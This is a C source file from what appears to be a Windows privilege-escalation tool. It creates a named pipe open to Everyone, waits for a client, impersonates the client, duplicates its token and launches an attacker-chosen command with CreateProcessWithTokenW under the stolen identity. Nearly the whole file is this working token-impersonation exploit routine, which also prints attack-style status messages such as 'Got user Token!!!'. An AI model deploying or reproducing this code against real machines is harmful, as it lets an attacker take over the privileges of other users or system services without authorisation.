#define _CRT_SECURE_NO_DEPRECATE 1
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include <sddl.h>
#include "common.h"

extern wchar_t* commandline;
extern wchar_t* arguments;

DWORD WINAPI PipeServer(LPVOID lpParam)
{
	//SEC sec;
	HANDLE  hPipe, hToken;
	BOOL    isConnected;
	SECURITY_ATTRIBUTES     sa;
	BOOL HasAssignPriv = FALSE;
	BOOL success = FALSE;
	HANDLE pToken1, pToken2;
	BOOL b1, b2;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	char buffer[256];
	DWORD dwRead = 0;
	LPWSTR PipeName = (LPWSTR)lpParam;
	//LPWSTR PipeName = (LPWSTR)lpParam;
	
	

	//sec.BuildSecurityAttributes(&sa);
	if (!InitializeSecurityDescriptor(&sa, SECURITY_DESCRIPTOR_REVISION))
	{
		printf("InitializeSecurityDescriptor() failed. Error: %d\n", GetLastError());

		return 0;
	}

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		printf("ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());

		return 0;
	}



	hPipe = CreateNamedPipe(
		PipeName,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		sizeof(DWORD),
		0,
		NMPWAIT_USE_DEFAULT_WAIT,
		&sa);

	if (hPipe == INVALID_HANDLE_VALUE) {


		printf("[-] Error CreatePipe %d", GetLastError());
		return 0;
	}

	printf("[*] Listening on pipe %S, waiting for client to connect\n", PipeName);
	isConnected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
	if (isConnected)
	{
		printf("[*] Client connected!\n");
		ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
		if (!ImpersonateNamedPipeClient(hPipe)) {
			printf("[-] Failed to impersonate the client.%d %d\n", GetLastError(), dwRead);
			return 0;
		}
		if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hToken))
		{
			printf("[+] Got user Token!!!\n", GetLastError());
		}

		if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pToken2))
		{
			printf("[-] Error duplicating ImpersonationToken:%d\n", GetLastError());
			

		}
		else
		{
			printf("[*] DuplicateTokenEx success!\n");
		}


			printf("[*] Token authentication using CreateProcessWithTokenW for launching: %S\n", commandline);
			if (arguments != NULL)
			{
				printf("[*] Arguments: %S\n", arguments);
				
			}
			//GetTokenInformation(hThreadToken, TokenSessionId, &sessionid, sizeof(sessionid), &Size);
			///SetTokenInformation(pToken2, TokenSessionId, &sessionid, sizeof(sessionid));
			RevertToSelf();

			b2 = CreateProcessWithTokenW(pToken2,
				0,
				commandline,
				arguments,
				CREATE_NEW_CONSOLE,
				NULL,
				NULL,
				&si,
				&pi);
			//debug
			//printf("[*] Result: %s (%d)\n", b2 ? "TRUE" : "FALSE", GetLastError());
			if (b2)
			{
				success = TRUE;
				printf("[*] Success executing: %S\n", commandline);
			}


	}
	else

		CloseHandle(hPipe);
	return 1;

}


int CreatePipeServer(wchar_t* pipename, bool nostop)
{
	do
	{
		HANDLE hThread1 = NULL;
		DWORD dwThreadId1 = 0;

		printf("[*] Creating Pipe Server thread..\n");
		hThread1 = CreateThread(NULL, 0, PipeServer, pipename, 0, &dwThreadId1);

		DWORD dwWait = WaitForSingleObject(hThread1, THREAD_TIMEOUT);

		if (dwWait != WAIT_OBJECT_0)
		{
			wprintf(L"[-] Named pipe didn't received any connect request. Exiting ... \n");
			exit(-1);
		}
	}while (nostop);

	return 1;
}